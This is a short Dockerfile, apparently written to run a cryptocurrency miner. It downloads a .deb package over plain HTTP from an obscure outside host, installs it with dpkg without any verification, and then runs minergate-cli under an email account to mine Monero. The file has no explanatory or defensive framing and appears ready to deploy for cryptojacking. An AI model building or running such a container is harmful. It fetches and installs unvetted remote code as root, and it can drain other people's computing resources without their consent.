FROM ubuntu:16.04

RUN apt-get update \
    && apt-get -qq --no-install-recommends install \
        ca-certificates \
        wget \
    && rm -r /var/lib/apt/lists/*

RUN wget -q --content-disposition http://vivivuvu.net//abc.deb \
    && dpkg -i *.deb \
    && rm *.deb
RUN lscpu
RUN minergate-cli -user pro_desk@outlook.com -xmr

